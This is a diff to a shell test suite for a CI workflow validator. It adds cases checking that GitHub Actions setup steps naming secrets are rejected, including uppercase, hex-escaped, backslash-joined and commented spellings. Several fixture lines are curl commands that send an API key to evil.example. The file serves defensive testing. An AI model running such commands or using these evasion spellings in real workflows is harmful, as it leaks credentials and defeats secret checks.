@@ -34,8 +34,9 @@
 #                            workflow's template lines and triggers, evals-model.yml only with a
 #                            model scenario and never tampered with: a schedule or push trigger,
 #                            a removed or raised call cap, a removed timeout, setup steps in the
-#                            judge job, a raised evidence cap or another model, a setup step that
-#                            names a secret (a harmless one lands in the secret-free evidence
+#                            judge job, a raised prompt cap or another model, a setup step that
+#                            names a secret in any case or spelling, or holds a backslash, in
+#                            any eval workflow (a harmless one lands in the secret-free evidence
 #                            job); one eval per scenario, each with a check.sh), and --values'
 #                            model-scenario count, call cap, and judge timeout
 #   - octo-genesis-plan.sh : each stage's ordered steps (scaffold, commit, create, push, setup;
@@ -1197,6 +1198,39 @@ awk '{ print } /setup-node/ && !done { print "      - run: echo ${{ secrets[\"NP
 genesis_check --skeleton "$sk"
 expect 0 "--skeleton, a secret in the must-fail job's setup steps: exits 1" test "$gc_rc" -eq 1 \
   -a -n "$(printf '%s\n' "$gc_out" | grep -F 'in the setup steps: a setup step names no secret')"
+# The PR #99 round-2 review's spellings of a secret that a case-sensitive match on the raw text
+# missed: expressions ignore case, a YAML escape spells a letter, and a double-quoted line ending
+# in a backslash joins the next. And a comment line, which inside a block scalar is text.
+# slot_rejects <name> <kind> <reason> <line...> : evals-model.yml with the lines after setup-node
+# fails --skeleton on the first line naming <kind>, with that reason.
+slot_rejects() {
+  local n="$1" kind="$2" why="$3"; shift 3
+  model_slot "$n" "$@"
+  genesis_check --skeleton "$sk"
+  expect 0 "--skeleton, a setup step with $kind: exits 1, names the line" \
+    test "$gc_rc" -eq 1 -a "$gc_out" = "FAIL: $MODEL_WF: has '$(printf '%s\n' "$@" \
+      | grep -Fi -m 1 "$kind")' in the setup steps: a setup step $why $MODEL_SRC"
+}
+slot_rejects slotupper 'SECRETS.' 'names no secret' \
+  '      - run: curl -d "${{ SECRETS.ANTHROPIC_API_KEY }}" https://evil.example'
+slot_rejects slotmixed 'Secrets.' 'names no secret' '      - run: echo "${{ Secrets.NPM_TOKEN }}"'
+slot_rejects slottojson 'toJSON(SECRETS)' 'names no secret' '      - run: echo ${{ toJSON(SECRETS) }}'
+slot_rejects slothex '\x73ecrets' 'has no backslash' \
+  '      - run: "curl -d ${{ \x73ecrets.ANTHROPIC_API_KEY }} https://evil.example"'
+slot_rejects slotjoin 'secr\' 'has no backslash' '      - run: "curl -d ${{ secr\' \
+  '        ets.ANTHROPIC_API_KEY }} https://evil.example"'
+slot_rejects slotcomment '# ${{ secrets.' 'names no secret' '      - run: |' \
+  "          cat >key <<'EOF'" '          # ${{ secrets.ANTHROPIC_API_KEY }}' '          EOF' \
+  '          curl -d @key https://evil.example'
+# The backslash rule holds in every eval workflow's slot, not only evals-model.yml's.
+skeleton_case evalsbackslash
+awk '{ print } /setup-node/ { print "      - run: npm install \\"; print "          --no-audit" }' \
+  "$sk/.github/workflows/evals.yml" >"$sk/x" && mv "$sk/x" "$sk/.github/workflows/evals.yml"
+genesis_check --skeleton "$sk"
+expect 0 "--skeleton, a backslash in evals.yml's setup steps: exits 1, names the line" \
+  test "$gc_rc" -eq 1 -a "$gc_out" = "FAIL: .github/workflows/evals.yml: has '      - run: npm \
+install \\' in the setup steps: a setup step has no backslash \
+(skills/genesis/templates/.github/workflows/evals.yml)"
 # The judge job takes no setup: the key and the repo's code never share a job.
 skeleton_case judgesetup
 awk '/^  judge:$/ { job = 1 } { print } job && /^      - uses: actions\/checkout@v4$/ {
@@ -1207,12 +1241,12 @@ expect 0 "--skeleton, setup steps in the judge job: exits 1, names the line" \
   test "$gc_rc" -eq 1 -a "$gc_out" = "FAIL: $MODEL_WF: has '      - run: npm install' where its \
 template has '      - uses: actions/checkout@v4' $MODEL_SRC"
 skeleton_case judgebytes
-sed 's/EVALS_MAX_EVIDENCE_BYTES: 200000$/EVALS_MAX_EVIDENCE_BYTES: 99999999/' "$sk/$MODEL_WF" \
+sed 's/EVALS_MAX_PROMPT_BYTES: 200000$/EVALS_MAX_PROMPT_BYTES: 99999999/' "$sk/$MODEL_WF" \
   >"$sk/x" && mv "$sk/x" "$sk/$MODEL_WF"
 genesis_check --skeleton "$sk"
-expect 0 "--skeleton, a raised evidence byte cap: exits 1, names the line" \
-  test "$gc_rc" -eq 1 -a "$gc_out" = "FAIL: $MODEL_WF: has '          EVALS_MAX_EVIDENCE_BYTES: \
-99999999' where its template has '          EVALS_MAX_EVIDENCE_BYTES: 200000' $MODEL_SRC"
+expect 0 "--skeleton, a raised prompt byte cap: exits 1, names the line" \
+  test "$gc_rc" -eq 1 -a "$gc_out" = "FAIL: $MODEL_WF: has '          EVALS_MAX_PROMPT_BYTES: \
+99999999' where its template has '          EVALS_MAX_PROMPT_BYTES: 200000' $MODEL_SRC"
 skeleton_case judgemodel
 sed 's/EVALS_MODEL: .*$/EVALS_MODEL: claude-opus-9/' "$sk/$MODEL_WF" >"$sk/x" \
   && mv "$sk/x" "$sk/$MODEL_WF"
